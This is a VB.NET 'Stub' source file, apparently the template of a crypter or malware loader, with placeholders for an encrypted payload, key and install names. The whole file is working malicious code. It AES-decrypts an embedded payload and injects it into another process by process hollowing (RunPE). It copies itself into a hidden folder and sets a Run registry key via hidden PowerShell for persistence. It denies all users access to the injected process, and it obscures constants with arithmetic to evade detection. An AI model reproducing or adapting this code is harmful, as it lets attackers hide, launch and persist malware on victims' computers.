'#define install

Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Runtime.InteropServices
Imports System.Security
Imports System.Security.AccessControl
Imports System.Security.Principal
Imports System.Resources
Imports System.Reflection
Imports System.IO
Imports System.Security.Cryptography
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms

Namespace Stub
   Public Class Program
	   Public Sub Run()
#If install Then
			Dim installer As New Installer()
			installer.Run()
#End If
			RunPE.Run(#Injection, AES_Decrypt(GetResource("#Payload")), False)
			Environment.Exit(0)
	   End Sub

		Public Function GetResource(ByVal file As String) As Byte()
			Dim ResManager As New ResourceManager("#ParentResource", System.Reflection.Assembly.GetExecutingAssembly())
			Return DirectCast(ResManager.GetObject(file), Byte())
		End Function

		Public Function AES_Decrypt(ByVal bytesToBeDecrypted() As Byte) As Byte()
			Dim decryptedBytes() As Byte = Nothing
			Dim saltBytes() As Byte = { 1, 2, 3, 4, 5, 6, 7, 8 }
			Using ms As New MemoryStream()
				Using AES As New RijndaelManaged()
					AES.KeySize = 256
					AES.BlockSize = 256
					Dim passwordBytes = Encoding.UTF8.GetBytes("#AesKey")
					Dim key = New Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000)
					AES.Key = key.GetBytes(AES.KeySize \ 8)
					AES.IV = key.GetBytes(AES.BlockSize \ 8)
					AES.Mode = CipherMode.CBC
					Using cs = New CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write)
						cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length)
						cs.Close()
					End Using
					decryptedBytes = ms.ToArray()
				End Using
			End Using
			Return decryptedBytes
		End Function
   End Class

#If install Then
	#Region "Installation"
	Public Class Installer
		Public Property EnableInstall() As Boolean
		Public FileName As New FileInfo("#FileName")
		Public DirectoryName As New DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.FolderName), "#SecondFolder"))
		Public RegistryName As String = "#RegistryName"
		Public Property Sleeping() As Integer

		''' <summary>
		''' run installation method
		''' </summary>
		Public Sub Run()
			If Not IsInstalled() Then
				Try
					CreateDirectory()
					InstallFile()
					InstallRegistry()
				Catch
				End Try
			End If
		End Sub

		''' <summary>
		''' returns true if the client is already installed
		''' </summary>
		Public Function IsInstalled() As Boolean
			If Application.ExecutablePath = Path.Combine(DirectoryName.FullName, FileName.Name) Then
				Return True
			Else
				Return False
			End If
		End Function

		''' <summary>
		''' if the folder does not exist, create a new one without or without hidden it
		''' </summary>
		Public Sub CreateDirectory()
			If Not DirectoryName.Exists Then
				DirectoryName.Create()
			End If
		End Sub

		''' <summary>
		''' if the file has a clone then search and kill the process, finally delete the file
		''' then write bytes array with or without increasing itself
		''' </summary>
		Public Sub InstallFile()
			Dim fullPath As String = Path.Combine(DirectoryName.FullName, FileName.Name)
			If FileName.Exists Then
				For Each process As Process In System.Diagnostics.Process.GetProcesses()
					Try
						If process.MainModule.FileName = fullPath Then
							process.Kill()
						End If
					Catch
					End Try
				Next process
				File.Delete(fullPath)
				Thread.Sleep(250)
			End If
			Using fs As New FileStream(fullPath, FileMode.Create, FileAccess.Write)
				Dim b() As Byte = File.ReadAllBytes(Application.ExecutablePath)
				fs.Write(b, 0, b.Length)
			End Using
		End Sub

		''' <summary>
		''' delete old registry name, then add the new one
		''' </summary>
		Public Sub InstallRegistry()
			Powershell("Remove-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name '" & RegistryName & "';" & "New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name '" & RegistryName & "' -Value '" & """" & Path.Combine(DirectoryName.FullName, FileName.Name) & """" & "' -PropertyType 'String'")
		End Sub

		Public Sub Powershell(ByVal args As String)
			Dim processStart As New ProcessStartInfo() With {.FileName = "powershell.exe", .Arguments = args, .WindowStyle = ProcessWindowStyle.Hidden, .CreateNoWindow = True, .UseShellExecute = False}
			Process.Start(processStart)
		End Sub

	End Class
	#End Region
#End If

	#Region "RunPE Class"
	Public NotInheritable Class RunPE

		Private Sub New()
		End Sub
		'github.com/Artiist/RunPE-Process-Protection/blob/master/RunPE.cs

		<DllImport("kernel32.dll", EntryPoint := "CreateProcess", CharSet := CharSet.Unicode), SuppressUnmanagedCodeSecurity> _
		Private Shared Function CreateProcess(ByVal applicationName As String, ByVal commandLine As String, ByVal processAttributes As IntPtr, ByVal threadAttributes As IntPtr, ByVal inheritHandles As Boolean, ByVal creationFlags As UInteger, ByVal environment As IntPtr, ByVal currentDirectory As String, ByRef startupInfo As StartupInformation, ByRef processInformation As ProcessInformation) As Boolean
		End Function
		<DllImport("kernel32.dll", EntryPoint := "GetThreadContext"), SuppressUnmanagedCodeSecurity> _
		Private Shared Function GetThreadContext(ByVal thread As IntPtr, ByVal context() As Integer) As Boolean
		End Function
		<DllImport("kernel32.dll", EntryPoint := "Wow64GetThreadContext"), SuppressUnmanagedCodeSecurity> _
		Private Shared Function Wow64GetThreadContext(ByVal thread As IntPtr, ByVal context() As Integer) As Boolean
		End Function
		<DllImport("kernel32.dll", EntryPoint := "SetThreadContext"), SuppressUnmanagedCodeSecurity> _
		Private Shared Function SetThreadContext(ByVal thread As IntPtr, ByVal context() As Integer) As Boolean
		End Function
		<DllImport("kernel32.dll", EntryPoint := "Wow64SetThreadContext"), SuppressUnmanagedCodeSecurity> _
		Private Shared Function Wow64SetThreadContext(ByVal thread As IntPtr, ByVal context() As Integer) As Boolean
		End Function
		<DllImport("kernel32.dll", EntryPoint := "ReadProcessMemory"), SuppressUnmanagedCodeSecurity> _
		Private Shared Function ReadProcessMemory(ByVal process As IntPtr, ByVal baseAddress As Integer, ByRef buffer As Integer, ByVal bufferSize As Integer, ByRef bytesRead As Integer) As Boolean
		End Function
		<DllImport("kernel32.dll", EntryPoint := "WriteProcessMemory"), SuppressUnmanagedCodeSecurity> _
		Private Shared Function WriteProcessMemory(ByVal process As IntPtr, ByVal baseAddress As Integer, ByVal buffer() As Byte, ByVal bufferSize As Integer, ByRef bytesWritten As Integer) As Boolean
		End Function
		<DllImport("ntdll.dll", EntryPoint := "NtUnmapViewOfSection"), SuppressUnmanagedCodeSecurity> _
		Private Shared Function NtUnmapViewOfSection(ByVal process As IntPtr, ByVal baseAddress As Integer) As Integer
		End Function
		<DllImport("kernel32.dll", EntryPoint := "VirtualAllocEx"), SuppressUnmanagedCodeSecurity> _
		Private Shared Function VirtualAllocEx(ByVal handle As IntPtr, ByVal address As Integer, ByVal length As Integer, ByVal type As Integer, ByVal protect As Integer) As Integer
		End Function
		<DllImport("kernel32.dll", EntryPoint := "ResumeThread"), SuppressUnmanagedCodeSecurity> _
		Private Shared Function ResumeThread(ByVal handle As IntPtr) As Integer
		End Function
		<StructLayout(LayoutKind.Sequential, Pack := 2 - 1)> _
		Private Structure ProcessInformation
			Public ReadOnly ProcessHandle As IntPtr
			Public ReadOnly ThreadHandle As IntPtr
			Public ReadOnly ProcessId As UInteger
			Private ReadOnly ThreadId As UInteger
		End Structure
		<StructLayout(LayoutKind.Sequential, Pack := 3 - 2)> _
		Private Structure StartupInformation
			Public Size As UInteger
			Private ReadOnly Reserved1 As String
			Private ReadOnly Desktop As String
			Private ReadOnly Title As String
			<MarshalAs(UnmanagedType.ByValArray, SizeConst := 18 + 18)> _
			Private ReadOnly Misc() As Byte
			Private ReadOnly Reserved2 As IntPtr
			Private ReadOnly StdInput As IntPtr
			Private ReadOnly StdOutput As IntPtr
			Private ReadOnly StdError As IntPtr
		End Structure

		Public Shared Function Run(ByVal path As String, ByVal data() As Byte, ByVal protect As Boolean) As Boolean
			For I As Integer = 1 To 5
				If HandleRun(path, data, protect) Then
					Return True
				End If
			Next I
			Return False
		End Function
		Private Shared Function HandleRun(ByVal path As String, ByVal data() As Byte, ByVal protect As Boolean) As Boolean
			Dim readWrite As Integer = 0
			Dim quotedPath As String = "#cmd"
			Dim si As New StartupInformation()
			Dim pi As New ProcessInformation()
			si.Size = Convert.ToUInt32(Marshal.SizeOf(GetType(StartupInformation)))
			Try
				If Not CreateProcess(path, quotedPath, IntPtr.Zero, IntPtr.Zero, False, 2 + 2, IntPtr.Zero, Nothing, si, pi) Then
					Throw New Exception()
				End If
				Dim fileAddress As Integer = BitConverter.ToInt32(data, 120 \ 2)
				Dim imageBase As Integer = BitConverter.ToInt32(data, fileAddress + 26 + 26)
				Dim context(178) As Integer
				context(0) = 32769 + 32769
				If IntPtr.Size = 8 \ 2 Then
					If Not GetThreadContext(pi.ThreadHandle, context) Then
						Throw New Exception()
					End If
				Else
					If Not Wow64GetThreadContext(pi.ThreadHandle, context) Then
						Throw New Exception()
					End If
				End If
				Dim ebx As Integer = context(41)
				Dim baseAddress As Integer = 1 - 1
				If Not ReadProcessMemory(pi.ProcessHandle, ebx + 4 + 4, baseAddress, 2 + 2, readWrite) Then
					Throw New Exception()
				End If
				If imageBase = baseAddress Then
					If NtUnmapViewOfSection(pi.ProcessHandle, baseAddress) <> 1 - 1 Then
						Throw New Exception()
					End If
				End If
				Dim sizeOfImage As Integer = BitConverter.ToInt32(data, fileAddress + 160 \ 2)
				Dim sizeOfHeaders As Integer = BitConverter.ToInt32(data, fileAddress + 42 + 42)
				Dim allowOverride As Boolean = False
				Dim newImageBase As Integer = VirtualAllocEx(pi.ProcessHandle, imageBase, sizeOfImage, 6144 + 6144, 32 + 32)

				If newImageBase = 0 Then
					Throw New Exception()
				End If
				If Not WriteProcessMemory(pi.ProcessHandle, newImageBase, data, sizeOfHeaders, readWrite) Then
					Throw New Exception()
				End If
				Dim sectionOffset As Integer = fileAddress + 124 * 2
				Dim numberOfSections As Short = BitConverter.ToInt16(data, fileAddress + 3 + 3)
				For I As Integer = 1 - 1 To numberOfSections - 1
					Dim virtualAddress As Integer = BitConverter.ToInt32(data, sectionOffset + 6 + 6)
					Dim sizeOfRawData As Integer = BitConverter.ToInt32(data, sectionOffset + 8 + 8)
					Dim pointerToRawData As Integer = BitConverter.ToInt32(data, sectionOffset + 40 \ 2)
					If sizeOfRawData <> 1 - 1 Then
						Dim sectionData(sizeOfRawData - 1) As Byte
						Buffer.BlockCopy(data, pointerToRawData, sectionData, 2 - 2, sectionData.Length)
						If Not WriteProcessMemory(pi.ProcessHandle, newImageBase + virtualAddress, sectionData, sectionData.Length, readWrite) Then
							Throw New Exception()
						End If
					End If
					sectionOffset += 120 \ 3
				Next I
				Dim pointerData() As Byte = BitConverter.GetBytes(newImageBase)
				If Not WriteProcessMemory(pi.ProcessHandle, ebx + 16 \ 2, pointerData, 2 * 2, readWrite) Then
					Throw New Exception()
				End If
				Dim addressOfEntryPoint As Integer = BitConverter.ToInt32(data, fileAddress + 80 \ 2)
				If allowOverride Then
					newImageBase = imageBase
				End If
				context(22 + 22) = newImageBase + addressOfEntryPoint

				If IntPtr.Size = 2 + 2 Then
					If Not SetThreadContext(pi.ThreadHandle, context) Then
						Throw New Exception()
					End If
				Else
					If Not Wow64SetThreadContext(pi.ThreadHandle, context) Then
						Throw New Exception()
					End If
				End If
				If ResumeThread(pi.ThreadHandle) = -1 Then
					Throw New Exception()
				End If
				If protect Then
					RunPE.Protect(pi.ProcessHandle)
				End If
			Catch
				Dim p As Process = Process.GetProcessById(Convert.ToInt32(pi.ProcessId))
				p.Kill()
				Return False
			End Try
			Return True
		End Function

		<DllImport("advapi32.dll", SetLastError := True)> _
		Private Shared Function GetKernelObjectSecurity(ByVal Handle As IntPtr, ByVal securityInformation As Integer, <Out()> ByVal pSecurityDescriptor() As Byte, ByVal nLength As UInteger, ByRef lpnLengthNeeded As UInteger) As Boolean
		End Function

		<DllImport("advapi32.dll", SetLastError := True)> _
		Private Shared Function SetKernelObjectSecurity(ByVal Handle As IntPtr, ByVal securityInformation As Integer, <[In]> ByVal pSecurityDescriptor() As Byte) As Boolean
		End Function

		Private Shared Sub SetProcessSecurityDescriptor(ByVal processHandle As IntPtr, ByVal rawSecurityDescriptor As RawSecurityDescriptor)
'INSTANT VB TODO TASK: There is no VB equivalent to 'checked' in this context:
'ORIGINAL LINE: byte[] array = new byte[checked(rawSecurityDescriptor.BinaryLength - 1 + 1 - 1 + 1)];
			Dim array(rawSecurityDescriptor.BinaryLength - 1 + 1 - 1) As Byte
			rawSecurityDescriptor.GetBinaryForm(array, 0)
			Dim flag As Boolean = Not SetKernelObjectSecurity(processHandle, 4, array)
			If flag Then
				Throw New Win32Exception()
			End If
		End Sub

		Private Shared Function InlineAssignHelper(Of T)(ByRef target As T, ByVal value As T) As T
			target = value
			Return value
		End Function

		Private Shared Function GetProcessSecurityDescriptor(ByVal processHandle As IntPtr) As RawSecurityDescriptor
			Dim array(-1) As Byte
			Dim bufferSize As New UInteger()
			GetKernelObjectSecurity(processHandle, 4, array, 0UI, bufferSize)
			If bufferSize < 0 OrElse bufferSize > Short.MaxValue Then
				Throw New Win32Exception()
			End If

'INSTANT VB TODO TASK: There is no VB equivalent to 'checked' in this context:
'ORIGINAL LINE: bool cdt = !GetKernelObjectSecurity(processHandle, 4, InlineAssignHelper(Of byte())(ref array, new byte[checked((int)(unchecked((ulong)bufferSize) - 1UL) + 1 - 1 + 1)]), bufferSize, ref bufferSize);
'INSTANT VB TODO TASK: There is no VB equivalent to 'unchecked' in this context:
			Dim cdt As Boolean = Not GetKernelObjectSecurity(processHandle, 4, InlineAssignHelper(Of Byte())(array, New Byte(CInt(CULng(bufferSize) - 1UL) + 1 - 1){}), bufferSize, bufferSize)
			If cdt Then
				Throw New Win32Exception()
			End If
			Return New RawSecurityDescriptor(array, 0)
		End Function

		Private Shared Sub Protect(ByVal processHandle As IntPtr)
			Dim rawSecurityDescriptor As RawSecurityDescriptor = GetProcessSecurityDescriptor(processHandle)
			rawSecurityDescriptor.DiscretionaryAcl.InsertAce(0, New CommonAce(AceFlags.None, AceQualifier.AccessDenied, 987135, New SecurityIdentifier(WellKnownSidType.WorldSid, Nothing), False, Nothing))
			SetProcessSecurityDescriptor(processHandle, rawSecurityDescriptor)
		End Sub

		Private Enum ProcessAccessRights
			DELETE = 65536
			ITE_OWNER = 524288
			PROCESS_ALL_ACCESS = 987135
			PROCESS_CREATE_PROCESS = 128
			PROCESS_CREATE_THREAD = 2
			PROCESS_DUP_HANDLE = 64
			PROCESS_QUERY_INFORMATION = 1024
			PROCESS_QUERY_LIMITED_INFORMATION = 4096
			PROCESS_SET_INFORMATION = 512
			PROCESS_SET_QUOTA = 256
			PROCESS_SUSPEND_RESUME = 2048
			PROCESS_TERMINATE = 1
			PROCESS_VM_OPERATION = 8
			PROCESS_VM_READ = 16
			PROCESS_VM_WRITE = 32
			READ_CONTROL = 131072
			STANDARD_RIGHTS_REQUIRED = 983040
			SYNCHRONIZE = 256
			WRITE_DAC = 262144
		End Enum
	End Class

	#End Region
End Namespace
